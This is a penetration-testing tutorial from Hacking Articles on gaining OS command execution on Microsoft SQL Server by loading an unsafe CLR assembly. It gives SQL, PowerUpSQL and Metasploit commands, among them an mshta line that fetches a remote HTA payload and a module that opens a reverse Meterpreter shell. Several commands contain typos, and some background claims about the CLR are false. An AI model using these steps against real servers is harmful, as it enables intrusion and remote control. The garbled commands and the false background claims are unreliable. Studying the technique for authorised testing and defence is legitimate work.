<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ms-sql-penetration-testing/" rel="category tag">MS-SQL Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">MSSQL for Pentester: Command Execution with CLR Assembly</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-clr-assembly/" rel="bookmark"><time class="entry-date published" datetime="2021-08-30T15:19:16+00:00">August 30, 2021</time><time class="updated" datetime="2025-05-10T18:16:08+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we will learn all about <strong data-start="207" data-end="252">MSSQL command execution with CLR assembly</strong> functionality provided by Microsoft and how we can exploit it to our potential.</span></p>
<h3><span style="color: #800000;">Table of Content:</span></h3>
<ul>
<li><strong><span style="color: #000000;">What is Common Language Runtime Integration?</span></strong></li>
<li><strong><span style="color: #000000;">Trustworthy Database Property</span></strong>
<ul>
<li><span style="color: #000000;">Enabling CLRIntegration with GUI</span></li>
<li><span style="color: #000000;">Check and Enabling Trustworthy</span></li>
</ul>
</li>
<li><strong><span style="color: #000000;">Exploit CLR Assembly</span></strong>
<ul>
<li><span style="color: #000000;">Creating a DLL File</span></li>
<li><span style="color: #000000;">Assemble DLL file with GUI</span></li>
<li><span style="color: #000000;">Enable CLRItegration with CLI</span></li>
<li><span style="color: #000000;">Import CLR DLL into SQL Server</span></li>
<li><span style="color: #000000;">PowerUpSQL (Manual)</span></li>
<li><span style="color: #000000;">PowerUpSQL (Remote)</span></li>
<li><span style="color: #000000;">Metasploit and PowerUpSQL</span></li>
<li><span style="color: #000000;">Metasploit</span></li>
</ul>
</li>
<li><strong><span style="color: #000000;">Conclusion</span></strong></li>
</ul>
<h3><span style="color: #800000;">What is Common Language Runtime Integration?</span></h3>
<p><span style="color: #000000;">Common Language Runtime is a feature provided by Microsoft as part of their Windows operating systems that allows for executing .NET Framework-compatible software. This runtime environment is responsible for implementing .NET programs, including compiled ASP.NET pages and Mono applications. It is used by .NET Framework and the Windows kernel and has been adopted by other operating systems such as Java ME, Apache Harmony, and Android. CLR is generally considered a more stable and fully-featured alternative to the Java Virtual Machine (JVM). It also manages the code execution environment for Microsoft operating systems.</span></p>
<p><span style="color: #000000;">These managed codes are compiled and are further used by units. These units are called assembly. These assemblies contain a load full of DLL or EXE files. EXE files can execute on their own, whereas DLL files need to be hosted in an application. If managed correctly, these DLL files can be enforced by the MS-SQL server as well.</span></p>
<p><span style="color: #000000;">The CLR receives compiled applications or assemblies from different processes via assembly loading, then executes them in an isolated execution environment to ensure their security and integrity. With the help of CLR, you can write stored procedures, user-defined functions, user-defined types, etc.</span></p>
<h3><span style="color: #800000;">Trustworthy Database Property</span></h3>
<p><span style="color: #000000;">Trustworthy database property helps to determine that whether the SQL server relies on a database or not. When working with CRL, there will be many instances where special commands or procedures deem it vital to have particular privileges. It requires such a license so that it can protect the database from malicious scenarios. Many properties can be used in windows servers and SQL servers to determine if the database is trusted. The properties must be set accordingly to allow the SQL server to function. One method for doing this is by adding the trust command on both servers.</span></p>
<p><span style="color: #000000;">A drawback of a Trustworthy Property would be that it might take up resources like memory, which could cause performance issues in specific scenarios. For this reason, it’s best not to rely on these types of properties too heavily when developing applications or data models. However, they are helpful when used with other techniques like event subscriptions or agent-based systems under a testing environment where resource consumption doesn’t matter much and performance isn’t essential either.</span></p>
<h4><span style="color: #000000;">Enabling CLRIntegration with GUI</span></h4>
<p><span style="color: #000000;">To enable the trustworthy feature manually, right-click on the server’s name. A drop-down menu will appear. From the said menu, click on the Facets option as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mQdAOOkPES8/YSy9UpOR6TI/AAAAAAAAyUQ/L7m_-Z2YkNMBPE0X_-ogzE29RcSiB0oKQCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Once you click on the <strong>Facets </strong>option, a Facets dialogue box will open. From this dialogue box, open the Facet drop-down menu and select the <strong>Surface Area Configuration</strong> option from this drop-down menu as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RnTstR6HQn8/YSy9lVSaWkI/AAAAAAAAyUY/kPbPJoXbPYofGd3HAqy62bZyDfHIMszyQCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">After choosing the Surface Area configuration, turn the value of <strong>ClrIntegrationEnabled </strong>true from false. This value can be changed under <strong>Facet properties,</strong> as you can see in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Hsys513gMmA/YSy9vvo_asI/AAAAAAAAyUc/RnRIpZF4PZQDoHm_7WrFGthaSscR2FngACLcBGAsYHQ/s16000/3.png"/></span></p>
<h4><span style="color: #000000;">Check and Enable Trustworthy</span></h4>
<p><span style="color: #000000;">After enabling CLR, go to the <strong>server&gt;Databases&gt;System Databases&gt;msdb</strong>. Right-click on msdb. A drop menu will appear. From this menu, choose the <strong>Properties</strong> option as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Oo725bQbKRw/YSy9zjTSnDI/AAAAAAAAyUg/Vb0prrOysY0EKwtMVnSZFcpxjpr50WqcgCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Once you have clicked on the <strong>Properties </strong>option, a dialogue box will open. From the left tab, choose options. In the right panel, you can see the <strong>trustworthy property</strong>. Here, you can change its value from false to true to enable it. The similar is shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xUj5ggPqtZ4/YSy93DXGuzI/AAAAAAAAyUo/26jVrtUvnbETAX2F2OHCh-zsPHpY7awHgCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">To enable trustworthy from CLI, open the query window of msdb and type the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ALTER DATABASE [msdb] SET TRUSTWORTHY ON</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hUxhziO-Il0/YSy98MBZZ3I/AAAAAAAAyUs/R0yz1UvUWmsbAZgTEaums5LKhRH5k4NqgCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Executing the above query will enable trustworthy property.</span></p>
<h3><span style="color: #800000;">Exploiting CLR Assembly </span></h3>
<h4><span style="color: #000000;">Creating a DLL File</span></h4>
<p><span style="color: #000000;">Now that we have understood the use of CLR assembly and trustworthy, along with their relationship with each other. And so, we will now exploit it to our potential. We know that CLR executes DLL files; therefore, we will create a DLL file using visual studio.</span></p>
<p><span style="color: #000000;">To create a DLL using visual studio; open <strong>visual studio</strong> and select <strong>Create a new project</strong> option, as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-upn4-Bsp024/YSy-CuhiAzI/AAAAAAAAyU0/OfTVdOfrdPQ7yH_fCGJxvHTHl74_afvBwCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">A new panel will open, and here, select <strong>Class Library (.NET framework)</strong> and then click on the <strong>Next</strong> button as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Kzxzl3MVqpg/YSy-HWUHSLI/AAAAAAAAyU8/4LlXy51WP24wH42TVBHM4spFo3_S448fwCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">A new window will open. In that window, give your project a name, location and then click on <strong>Create</strong> button as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Eb2ZW3IvL8g/YSy-MJinM-I/AAAAAAAAyVE/-Xhw2-HhQ0IXyW0PSEuKer5421DLbvMHACLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Following the above steps will create your new project and add the code that will be necessary. The code that we have used can be found<span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/"> <strong>here</strong></a></span>. Now, in the menu bar, click on the <strong>Build</strong> menu as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LSlqZDhlxA0/YSy-RaRzElI/AAAAAAAAyVI/dnJCB9ZiLx86yfs4i70t-FwrZ-GXmyqowCLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">From the Build’s drop-down menu, select the <strong>Build Solution</strong> option as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mLXBLG5jn7c/YSy-U2vlDqI/AAAAAAAAyVM/q1kYvfXlA2MMEirwHma3FuRpLgjecf0mQCLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">As you can see in the image below, now your DLL file is created as desired. Now that we have our DLL file, we can exploit CLR with the help of this DLL file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lg43TA17gts/YSy-cxrOEII/AAAAAAAAyVY/7O8PX3JLVAA3RZKcReHBnIG6_umO6782ACLcBGAsYHQ/s16000/15.png"/></span></p>
<h4>Import CLR DLL into SQL Server <span style="color: #000000;">through GUI</span></h4>
<p><span style="color: #000000;">Let’s put that DLL file to good use. Go to <strong>server&gt;Databases&gt;System Databases&gt;msdb&gt;Programmability,</strong> and under Programmability, there will be an <strong>Assemblies</strong> option. Right-click on the said option and select <strong>New Assembly</strong> from the drop-down menu as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tM9x7svEPrk/YSy-jYQdQzI/AAAAAAAAyVg/BnHTCEiL88IEy72XqdBfVl7lbK9P-pC-QCLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">A dialogue box will open after following the above steps. In the dialogue box, set the Permission set to <strong>Unrestricted</strong> and give the path of your DLL file and then finally click on the <strong>OK </strong>button as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DoliCH9O1F4/YSy-r-O3BrI/AAAAAAAAyVo/olFDbpBD2c8magrYnKkEkpsOCpr2OvtrgCLcBGAsYHQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">The above steps have created an assembly with your DLL file. You can see it by going to <strong>server&gt;Databases&gt;system Databses&gt;msdb&gt;Progammibility&gt;Assemblies&gt;*DLL File*. </strong>The same is shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UZGM5YAAF7U/YSy-xXMUH3I/AAAAAAAAyVw/nx18lkS2XYgyynQ1jJLFC7rj-160XjLAwCLcBGAsYHQ/s16000/18.png"/></span></p>
<p><span style="color: #000000;">To execute that DLL file, run the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [shell].[StoredProcedures].[cmd_exec];
GO</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-srGUXgAZWqM/YSy-1Z7JAGI/AAAAAAAAyV0/udvP_4o9ARg2IQ62DMtbJHZica7c-j5lACLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">With the query above, the DLL file is executed. And now you can run any command as a query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cmd_exec 'whoami'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vJo3Gy2UqMU/YSy-5dIANrI/AAAAAAAAyV4/KVIOM24xk_0eXhSPW0NhkOXfnjJnEF5ogCLcBGAsYHQ/s16000/20.png"/></span></p>
<p><span style="color: #000000;">As you can see in the image above, the command is executed, and you can see the result of the command in the output panel.</span></p>
<p><span style="color: #000000;">The method we just learned was manual. Let us now learn how we can do the same thing using the command line. But first, we should delete the assembly and procedure to start afresh, and to do so, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">DROP PROCEDURE  cmd_exec
DROP ASSEMBLY shell</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kA1Q97MewyM/YSy--kkGwrI/AAAAAAAAyV8/c6E-Vhn3sKwhDB_j6llejiesL7A2zlyYgCLcBGAsYHQ/s16000/21.png"/></span></p>
<h4>Import CLR DLL into SQL Server through CLI</h4>
<p><span style="color: #000000;">We can also exploit CLR using various queries through the command line. Firstly, let access the database by using the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use msdb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xs5BD8utW5k/YSy_FFOLW5I/AAAAAAAAyWE/JeuBhUnsoskpmF6aCXry39eZEsLe3x1bQCLcBGAsYHQ/s16000/22.0.png"/></span></p>
<p><span style="color: #000000;">Once we have accessed the database, we now need to enable CLR integration and for that type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">EXEC sp_configure 'clr enabled', 1;
RECONFIGURE
GO</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IBszG-k04LU/YSy_JsoTCPI/AAAAAAAAyWI/wIJbeint3n4ziej9-kLGwwOlsotlaZLhgCLcBGAsYHQ/s16000/22.1.png"/></span></p>
<p><span style="color: #000000;">Now to confirm whether CLR integration was enabled with the above command or not, use the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SELECT * FROM sys.configuration WHERE name = 'clr enabled'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--viRT5yw9Q0/YSy_QESFvkI/AAAAAAAAyWQ/1TFAf4eAn7cqs6BFNsl_pHzpQtk8MzL4gCLcBGAsYHQ/s16000/22.png"/></span></p>
<p><span style="color: #000000;">And in the image above, you can see that the value of configuration is 1, which means our CLR integration is enabled.</span></p>
<p><span style="color: #000000;">Moving on, we have to enable trustworthy property next. So, for that type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ALTER DATABASE msdb SET TRUSTWORTHY ON</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Zti_k-YqqOs/YSy_U6cqH8I/AAAAAAAAyWU/FW93idvhc0w_UJll6Q0R8xc5XskAREVsQCLcBGAsYHQ/s16000/23.png"/></span></p>
<p><span style="color: #000000;">To check whether our above command was successfully executed or not, use the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">select name, is_trustworthy_on from sys.databases</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7nlrDgV8Fpw/YSy_ZT2k2KI/AAAAAAAAyWc/CBaOpGuGumMepcfcc--GuE7qV9qQ6Uc1wCLcBGAsYHQ/s16000/24.png"/></span></p>
<p><span style="color: #000000;">In the above image, you can see that value for trustworthy is 1 of the msdb database. That means the said property is successfully enabled.</span></p>
<p><span style="color: #000000;">We already have a DLL file called shell that we created with the help of visual studio earlier. You can find that file in the temp folder.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fkpkew1lWo0/YSy_fg96_7I/AAAAAAAAyWg/CvvWhAMw4D4EZjEmE2l7LKg6BivqGmjWACLcBGAsYHQ/s16000/25.png"/></span></p>
<p><span style="color: #000000;">Now let’s use this DLL file and create an assembly with the help of the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">CREATE ASSEMBLY shell
FROM 'c:\temp\shell.dll'
WITH PERMISION_SET = UNSAFE;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sqCf6WHH2eY/YSy_qCGt0nI/AAAAAAAAyWs/xTXHFKnnVRk2tk-gk1wdYvwP33EJbhjngCLcBGAsYHQ/s16000/26.png"/></span></p>
<p><span style="color: #000000;">Our next step is to create the procedure and we will do so with the help of the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [shell].[StoredProcedures].[cmd_exec];
GO</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XlvjP517HXE/YSy_ymzU8VI/AAAAAAAAyW0/JS93dGNAyF02cUEjIBNYiCXgs6WUVZ9TACLcBGAsYHQ/s16000/27.png"/></span></p>
<p><span style="color: #000000;">Once the above commands are executed successfully, you can then execute any command such as;</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cmd_exec 'whoami'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-J5rB5Zj-Jis/YSy_7aKu1VI/AAAAAAAAyXA/EOQTbReY4ZALxF5fqmaKdyhabKmeSLqQwCLcBGAsYHQ/s16000/28.png"/></span></p>
<p><span style="color: #000000;">And as you can see in the above image, we have the result of our command.</span></p>
<h4><span style="color: #000000;">PowerUpSQL (Manual)</span></h4>
<p><span style="color: #000000;">When it comes to exploiting SQL servers, PowerUpSQL is the best third-party tool. This tool will also allow us to exploit CLR through DLL files to our potential. And to do so, use the following set of commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell
powershell -ep bypass
cd .\PowerUpSQL-master\
Import-Moduolle .\PowerUpSQL.ps1
Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir c:\temp -Verbose</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-c6HB5ODqF64/YSzAAMmtKGI/AAAAAAAAyXE/KFse7yZZud8vfCj8-5DkSYq3nRO9ngtzACLcBGAsYHQ/s16000/35.png"/></span></p>
<p><span style="color: #000000;">The command will create three files for you, i.e<strong>., .csc, .dll, and .txt</strong> as shown in the image above. Now go to the temp directory and open the txt file with the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">type runcmd.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RZSpVhvEYFk/YSzAEauF5CI/AAAAAAAAyXM/5bVEsxJSrKY6xsUNXr2w9AL3rCrdDc5eQCLcBGAsYHQ/s16000/36.png"/></span></p>
<p><span style="color: #000000;">Now take the entire content of the said txt file, copy it, and paste it in the SQL query panel as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-V_6ohjq248c/YSzAK--QjPI/AAAAAAAAyXQ/cMX9mad_BZcSB54OO5Dyu1hKlr_QruDYACLcBGAsYHQ/s16000/37.png"/></span></p>
<p><span style="color: #000000;">After running the code, you will have your result in the output section, as shown in the image above.</span></p>
<h4><span style="color: #000000;">PowerUpSQL (Remotely)</span></h4>
<p><span style="color: #000000;">Another PowerUpSQL method to retrieve the same result is a remote method. This method is useful as even if the CLRIntegration is disable, it will go ahead and enable it for you. The command for this is as following:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-SQLOSCmdCLR -Username sa -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS –Command "whoami" -Verbose</pre>
<p><span style="color: #000000;">Note: this command is useful if you have the username and password of the database.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FSH4a69_HdQ/YSzAPdJXVbI/AAAAAAAAyXU/7s_Tb7bfL9INCTBOXDnULYcxMQwXEnAxgCLcBGAsYHQ/s16000/40.png"/></span></p>
<p><span style="color: #000000;">You can also see in the result in a grid view by using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-SQLStoredProcedureCLR -Verbose -Instance WIN-P83OS778EQK\SQLEXPRESS -Username sa -Password 'Password@1' | Out-GridView</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EmryVaCd-d4/YSzAThzUFXI/AAAAAAAAyXc/PagpR7RcrWMXcvNfYlnu58Qg6NZ2UZHCACLcBGAsYHQ/s16000/41.1.png"/></span></p>
<h4><span style="color: #000000;">Metasploit and PowerUpSQL</span></h4>
<p><span style="color: #000000;">In this method, we will combine Metasploit and PowerUpSQL tools to put both of them to good use to achieve the desired result. For this open Metasploit and type the following set of commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/misc/hta_server
set srvhost *localhost*
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uTAaMIrYUfM/YSzAaFBxdlI/AAAAAAAAyXk/18ivnb9h_tI_dJftunzyWsjp3SWGLMRagCLcBGAsYHQ/s16000/41.png"/></span></p>
<p><span style="color: #000000;">The above exploit will generate a URL as shown in the image aove. Copy the said URL and paste it in the following command of PowerUpSQL:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-SQLOSCmdCLR -Username sa -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS –Command "mshta.exe http://192.168.1.2:8080/LTCSUUkWrp6q.hta" -Verbose</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-L1DyEqYq3TE/YSzAf7BKD-I/AAAAAAAAyXs/Tf0UG5RzgYQHtWv_paaoCGh3vpIIeagGgCLcBGAsYHQ/s16000/42.png"/></span></p>
<p><span style="color: #000000;">Once the above command is executed, you will have your meterpreter session to the server as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9AioBQtV6vI/YSzAmrDiA6I/AAAAAAAAyXw/fY6886EyFUIuJ7LAhXzEAKFOWNOZ1w-CQCLcBGAsYHQ/s16000/43.png"/></span></p>
<h4><span style="color: #000000;">Metasploit</span></h4>
<p><span style="color: #000000;">Metasploit being the excellent framework that it is, makes all our work simple and easy. If we review, to exploit CLR, we have first to enable CLR integration and then enable trustworthy database property. After that, we create an assembly that executes our DLL file. All these multiple steps are taken care of with a single Metasploit exploit. To use the said exploit, type the following set of commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/mssql/mssql_clr_payload
set rhosts n*locahost*
set username sa
set password Password@1
set payload mwindows/x64/meterpreter/rever_tcp
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TOAL79nbOr0/YSzAqavSxbI/AAAAAAAAyX4/4E9ip1vxgMQ6z89tPdimAqCHN8SmW54UwCLcBGAsYHQ/s16000/50.png"/></span></p>
<p><span style="color: #000000;">And as you can see, this payload follows all out multiple steps for us and even gets us the meterpreter session. The only condition for this exploit to work is to know the username and password.</span></p>
<p><strong>Reference</strong>: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/"><strong>https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/</strong></a></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">CLR Integration is prone to vulnerability. And most cases, you will find that trustworthy property is enabled, but if it isn’t, we have learned many methods to allow it to activate in the article. These were all the methods through which one can exploit CLR integration using DLL files as it enables the execution of the DLL files. Such techniques also help to pentest an MS-SQL server.</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Yashika Dhir is a Cyber Security Researcher, Penetration Tester, Red Teamer, Purple Team enthusiast. Contact her on </span><strong><a href="https://www.linkedin.com/in/yashika-dhir/">Linkedin</a> </strong><span style="color: #000000;">and </span><strong>Twitter</strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
